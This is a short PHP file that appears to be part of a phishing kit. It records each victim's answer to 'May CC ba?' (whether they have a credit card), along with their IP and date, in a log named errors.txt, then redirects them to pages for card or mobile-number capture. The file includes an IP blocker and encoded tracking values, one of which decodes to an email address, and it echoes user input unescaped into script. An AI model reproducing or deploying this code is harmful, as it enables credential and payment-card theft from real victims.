<?php
include 'AddResult.php';
include 'ip_blocker.php';
if(isset($_POST['YES'])) {

     $victim_creds = "<span style='color:gray;'>{$date} {$IP}</span>  <span style='color:yellow;'>May CC ba?</span> > [<span style='color:green;'>{$_POST['YES']}</span>]<br>";
          AddResult('errors.txt', $victim_creds);


     $m = $_POST['YES'];
	echo "<script>";
	echo "window.location.assign('cc.php?auth=$m&secure=dW5hbWU=&id=bWFuZ21ra2Vwd2VuZ0B5YWhvby5jb20=');";
	echo "</script>";
}

if(isset($_POST['NO'])) {


     $victim_creds = "<span style='color:gray;'>{$date} {$IP}</span>  <span style='color:yellow;'>May CC ba?</span> > [<span style='color:green;'>{$_POST['NO']}</span>]<br>";
          AddResult('errors.txt', $victim_creds);

     $m = $_POST['NO'];
	echo "<script>";
	echo "window.location.assign('mobilenumber.php?auth=$m&secure=dW5hbWU=&id=bWFuZ21ra2Vwd2VuZ0B5YWhvby5jb20=');";
	echo "</script>";
}
?>